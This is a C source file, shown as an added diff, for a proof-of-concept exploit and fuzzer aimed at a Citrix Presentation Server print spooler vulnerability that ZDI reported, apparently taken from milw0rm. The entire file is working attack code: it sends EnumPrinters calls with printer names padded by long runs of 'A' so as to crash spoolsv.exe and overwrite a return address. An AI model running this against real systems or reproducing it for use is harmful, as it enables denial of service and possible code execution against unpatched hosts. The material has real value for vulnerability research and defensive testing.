@@ -1,0 +1,179 @@
+/*
+ Proof of concept exploit for ZDI - Citrix Metaframe spooler service vulnerability
+ Microsoft Windows - EnumPrinter() & EnumPrinterW() Fuzzer v0.1 
+ Author: Andres Tarasco Acuña - atarasco@514.es
+ url: http://www.514.es
+
+ This is an intial version of EnumPrinter() and OpenPrinter() fuzzer. I hope that 
+ it will help to identify similar vulnerabilities.
+ Tested against win2k3 + Citrix presentation server. If the system is vulnerable 
+ this application will kill spooler service (spoolsv.exe ) and ret will be overwritten
+ with 0x00410041
+ 
+ 514 Tiger Team ownz u
+
+ */
+#include <stdio.h>
+#include <windows.h>
+#include <Winspool.h>
+#pragma comment(lib,"Winspool.lib")
+
+
+void usage(char *name) {
+      printf("Usage: %s -a (Ascii fuzzing for local printer providers)\n",name);
+      printf("Usage: %s -u (Unicode fuzzing for local printer providers)\n",name);
+      exit(0);
+}
+
+#define RECURSIVE 1
+#define OPT_UNICODE 2
+#define MAX_PRINTER_LEN 4096
+
+#define _DBG_
+#undef _DBG_
+
+int CustomFuzzSize[]= {25,50,100,150,250,300,500,1000,1500, 2000};
+wchar_t dst[MAX_PRINTER_LEN];
+
+
+
+void Fuzzer( wchar_t *orig,int opt, int unicode) {
+   int i,j;
+   int len;
+
+   if (unicode) len=wcslen(orig); 
+   else len=strlen((char *)orig);
+   memset((char *)dst,'\0',sizeof(dst));
+   memcpy((char *)dst,orig,len*(1+unicode));
+   j=wcslen(orig);
+   for(i=0;i<CustomFuzzSize[opt];i++) {
+      if (unicode) dst[j+i]='A';
+      else ((char *)dst)[j+i]=(char)'A';
+   }
+
+   if (opt==0) {
+   if (unicode)
+   printf("Fuzzing: %S ( %i -%i)\n",dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);
+   else printf("Fuzzing: %s ( %i -%i)\n",dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);
+   }
+   
+}
+
+
+DWORD ShowPrinterInfo(wchar_t *lpName,  int level, int opt, char *padding) {
+
+   unsigned char *lpInfo;
+   int i,j;
+   DWORD n;
+   DWORD dwSizeNeeded=0;
+   char newpadding[50];
+
+   DWORD ret;
+
+   if (opt & OPT_UNICODE) {
+      EnumPrintersW ( PRINTER_ENUM_NAME, (wchar_t* )lpName, level, NULL, 0, &dwSizeNeeded, &n );
+   } else {
+      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)lpName, level, NULL, 0, &dwSizeNeeded, &n );
+   }
+   if (dwSizeNeeded==0) {    
+#ifdef _DBG_
+      printf ( "EnumPrintersX() Invalid. Error: %d \n",GetLastError() );
+#endif
+      return(-1);
+   }
+
+   lpInfo = (void *)HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY, dwSizeNeeded );
+
+   if ( lpInfo != NULL ) {
+         if (opt & OPT_UNICODE) {
+            ret=EnumPrintersW ( PRINTER_ENUM_NAME,(wchar_t *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&dwSizeNeeded,&n);
+         } else {
+            ret=EnumPrintersA ( PRINTER_ENUM_NAME,(char *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&dwSizeNeeded,&n);
+         }
+      if (  ret== 0 )
+	   {
+#ifdef _DBG_
+		   printf ( "EnumPrintersX() Failed. Error: %d ( %i)\n",GetLastError(),dwSizeNeeded  );
+#endif
+         HeapFree ( GetProcessHeap (), 0, lpInfo );
+		   return 0;
+      } else {
+         PRINTER_INFO_1 *dataI;
+         PRINTER_INFO_2 *dataII;
+         
+	      for ( i=0; i < n; i++ ) {
+               dataI=(PRINTER_INFO_1*)lpInfo;
+             
+               printf("%s",padding);
+               if (opt & OPT_UNICODE) {
+                  if (dataI[i].pName)  printf(" %S - ",(dataI[i].pName));
+                  if (dataI[i].pDescription)  printf(" %S ",(dataI[i].pDescription));
+                  //if (dataI[i].pComment)  printf(" %S - ",(dataI[i].pComment));
+               } else {
+                  if (dataI[i].pName)  printf(" %s - ",(dataI[i].pName));
+                  if (dataI[i].pDescription)  printf(" %s ",(dataI[i].pDescription));
+                  //if (dataI[i].pComment)  printf(" %s - ",(dataI[i].pComment));
+               }
+                  printf("\n");
+              for(j=0;j<sizeof(CustomFuzzSize)/sizeof(int);j++) {
+                 if (opt & OPT_UNICODE) {
+                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt & OPT_UNICODE);
+                    ShowPrinterInfo((wchar_t*)dst,level, OPT_UNICODE, newpadding);            
+                 } else {
+                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt & OPT_UNICODE);
+                     ShowPrinterInfo((wchar_t*)dst,level, 0, newpadding);            
+                 }
+               }
+               if (opt & RECURSIVE ) {
+                  strcpy (newpadding,padding);
+                  strcat(newpadding,"---");
+                  newpadding[1]='+';
+                  ShowPrinterInfo(dataI[i].pName,level, opt, newpadding);
+               }
+               printf("\n");
+         }
+         HeapFree ( GetProcessHeap (), 0, lpInfo );
+      }
+   }
+
+   return(1);
+}
+
+int testPrinters(void) {
+   DWORD size,ret,err;
+   ret=EnumPrintersW ( PRINTER_ENUM_NAME, NULL, 1, NULL, 0, &size, &size );
+      if (  ret==0 ) {
+         err=GetLastError();
+         if (err!=122) { //size error
+            printf("[-] Printer Service not available - Error: %d\n",err );         
+            exit(-1);
+         }
+      } 
+      return(1);
+}
+int main ( int argc, char *argv[] )
+{
+
+   printf("[+] Citrix Presentation Server - Local EnumPrinterW() POC exploit\n");
+   printf("[+] Discovered by ZDI - http://secunia.com/advisories/23869/\n");
+   printf("[+] Proof of concept by Andres Tarasco - atarasco@514.es\n\n");
+
+   if (argc!=2) usage(argv[0]);
+
+   testPrinters();
+   printf("[+] Printer Service Seems to be working.. Fuzzing\n");
+ 
+   if ( (argv[1][1]=='u'))  { 
+      ShowPrinterInfo(NULL,1,3,"[*]");
+      testPrinters();
+   }
+   if ( (argv[1][1]=='a'))  {
+      ShowPrinterInfo(NULL,1,1,"[*]");
+      testPrinters();
+   }
+   
+
+   return(0);
+ } 
+
+// milw0rm.com [2007-01-26]
